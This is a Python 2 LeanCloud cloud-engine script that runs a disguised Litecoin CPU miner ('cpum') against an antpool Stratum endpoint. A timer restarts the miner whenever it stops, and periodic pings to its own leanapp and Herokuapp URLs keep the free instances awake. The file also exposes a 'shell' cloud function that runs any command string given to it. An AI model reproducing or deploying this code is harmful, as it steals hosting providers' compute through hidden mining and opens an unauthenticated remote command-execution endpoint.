# coding: utf-8
from leancloud import Engine
from leancloud import LeanEngineError

import subprocess
import select
import requests
import time
import os   # 在云引擎 Python 环境中使用自定义的环境变量,WORK_ID=1
import psutil

engine = Engine()

str_setup = 'chmod +x cpum'

#str_cmd = 'PATH="$PATH:/home/leanengine/app" && echo $PATH && ls -l'
ENGNIE_RESTARTED = True
SUBPROCESS_RUNNING = False      #MineShell中进程有消息，就设为True, 但定时置为False，以便查看进程是否运行
NUM_ENGINE_LOOP = 0             #EngineLoop运行次数，用于决定是否唤醒自身
NUM_SUBPROCESS_LOOP = 0         #SUBPROCESS_RUNNING = False时的运行次数，用于决定是否重启Mine

def MineShell( cmd, **params ):
	global SUBPROCESS_RUNNING
	print 'shell:', cmd
	result = subprocess.Popen(
		[ cmd ],
		shell=True,
		stdout=subprocess.PIPE,
		stderr=subprocess.PIPE
	)
	# read date from pipe
	n = 0
	select_rfds = [ result.stdout, result.stderr ]
	while len( select_rfds ) > 0:
		(rfds, wfds, efds) = select.select( select_rfds, [ ], [ ] )  # select函数阻塞进程，直到select_rfds中的套接字被触发
		SUBPROCESS_RUNNING = True
		if result.stdout in rfds:
			readbuf_msg = result.stdout.readline()  # 行缓冲
			if len( readbuf_msg ) == 0:
				select_rfds.remove( result.stdout )  # result.stdout需要remove，否则进程不会结束
			else:
				print readbuf_msg[29:],             #简化的console消息
				if (n % 16 == 0):
					print psutil.cpu_times_percent()
				n += 1

		if result.stderr in rfds:
			readbuf_errmsg = result.stderr.readline()
			if len( readbuf_errmsg ) == 0:
				select_rfds.remove( result.stderr )  # result.stderr，否则进程不会结束
			else:
				print readbuf_errmsg,
	result.wait()  # 等待字进程结束( 等待shell命令结束 )
	print result.returncode
	##(stdoutMsg,stderrMsg) = result .communicate()#非阻塞时读法.
	return result.returncode


def Mine():
	#str_cmd = 'PATH="$PATH:/home/leanengine/app" && echo $PATH && cpum --url=stratum+tcp://stratum-ltc.antpool.com:443  --algo=scrypt --threads=4 --user=waylite'
	str_cmd = 'PATH="$PATH:/home/leanengine/app" && echo $PATH && cpum --url=stratum+tcp://stratum-ltc.antpool.com:443  --algo=scrypt --user=waylite'
	#str_cmd = 'PATH="$PATH:/media/azhu/sda6/LeanCloud/Wayho_Lean/mlite01" && echo $PATH && cpum --url=stratum+tcp://stratum-ltc.antpool.com:443  --algo=scrypt --user=waylite'

	print 'Mine:Once'
	OutputShell(str_setup)
	time.sleep(1)
	WORK_ID = os.environ.get( 'WORK_ID' )
	str_cmd += ' --userpass waylite.' + WORK_ID + ':x'
	OutputShell(str_cmd)

# 1m运行一次
# 只需要一个定时器，解决全部定时任务
@engine.define( 'engineloop' )
def EngineLoop(**params):
	global ENGNIE_RESTARTED
	global SUBPROCESS_RUNNING
	global NUM_ENGINE_LOOP
	global NUM_SUBPROCESS_LOOP

	if (NUM_ENGINE_LOOP % 25 == 0):  # 25Loop唤醒自身
		SUBPROCESS_RUNNING = False
		Heart()

	if (ENGNIE_RESTARTED):
		ENGNIE_RESTARTED = False
		Mine()
	else:
		# 检查进程过程中
		if (SUBPROCESS_RUNNING):
			NUM_SUBPROCESS_LOOP = 0
			print 'R',
		else:
			if (NUM_SUBPROCESS_LOOP < 6):
				print 'SUBPROCESS not in run',NUM_SUBPROCESS_LOOP
				NUM_SUBPROCESS_LOOP += 1
			else:
				NUM_SUBPROCESS_LOOP = 0     # 6Loop内无消息，认为进程结束了
				Mine()
	NUM_ENGINE_LOOP += 1
	return True

#上传运行一次
# 15 5/15 9-23 * * ?
@engine.define( 'setup' )
def Setup(**params):
	print str_setup
	OutputShell(str_setup)
	return True

@engine.define( 'install' )
def cmd_install(**params):
	OutputShell('apt-get install cpulimit')
	OutputShell('sudo apt-get install cpulimit')
	return True

@engine.define( 'ls' )
def ls_cmd(**params):
	OutputShell('ls -l')
	return True

@engine.define( 'sysinfo' )
def cmd_sysinfo(**params):
	OutputShell('cat /etc/issue && cat /proc/cpuinfo')
	return True

@engine.define( 'cpulimit' )
def cmd_cpulimit(**params):
	OutputShell('cpulimit -l 40')
	return True



#半小时运行一次
# 15 5/15 9-23 * * ?
@engine.define( 'heart' )
def Heart(**params):
	WORK_ID = os.environ.get( 'WORK_ID' )
	url = "http://mlite0" + WORK_ID + ".leanapp.cn/heart"
	response = requests.get( url )
	print url,'..Heart End'
	print 'Heart of herokuapp',
	response = requests.get( "https://my-m001.herokuapp.com/" )
	response = requests.get( "https://my-m002.herokuapp.com/" )
	print '..Heart End'
	return True

@engine.define( 'shell' )
# 调试 {'cmd':'ls -l' }
def OutputShell( cmd, **params ):
	print 'shell:',cmd
	result = subprocess.Popen(
		#[ "ping 127.0.0.1" ],
		#[ "find /usr" ],
		[ cmd ],
		shell=True,
		stdout=subprocess.PIPE,
		stderr=subprocess.PIPE
	)
	# read date from pipe
	select_rfds = [ result.stdout, result.stderr ]
	while len( select_rfds ) > 0:
		(rfds, wfds, efds) = select.select( select_rfds, [ ], [ ] ) #select函数阻塞进程，直到select_rfds中的套接字被触发
		if result.stdout in rfds:
			readbuf_msg = result.stdout.readline()      #行缓冲
			if len( readbuf_msg ) == 0:
				select_rfds.remove( result.stdout )     #result.stdout需要remove，否则进程不会结束
			else:
				print readbuf_msg,

		if result.stderr in rfds:
			readbuf_errmsg = result.stderr.readline()
			if len( readbuf_errmsg ) == 0:
				select_rfds.remove( result.stderr )     #result.stderr，否则进程不会结束
			else:
				print readbuf_errmsg,
	result.wait() # 等待字进程结束( 等待shell命令结束 )
	print result.returncode
	##(stdoutMsg,stderrMsg) = result .communicate()#非阻塞时读法.
	return result.returncode

@engine.define( 'cpuinfo' )
def cpu_info():
	try:
		print 'psutil.cpu_times_percent()', psutil.cpu_times_percent()
	except:
		pass
	return True


	print 'psutil.pids()',psutil.pids()
	print 'psutil.cpu_count()',psutil.cpu_count()

	try:
		print 'psutil.cpu_count(logical=False)', psutil.cpu_count(logical=False)
	except:
		pass
	try:
		print 'psutil.cpu_stats()', psutil.cpu_stats()
	except:
		pass
	try:
		print 'psutil.cpu_freq()', psutil.cpu_freq()
	except:
		pass
	try:
		print 'psutil.cpu_percent()', psutil.cpu_percent()
	except:
		pass
	try:
		print 'psutil.cpu_times_percent()', psutil.cpu_times_percent()
	except:
		pass
	try:
		print 'psutil.cpu_times()', psutil.cpu_times()
	except:
		pass
	try:
		print 'psutil.cpu_times(percpu=True)', psutil.cpu_times(percpu=True)
	except:
		pass
	try:
		print 'psutil.cpu_times().user', psutil.cpu_times().user
	except:
		pass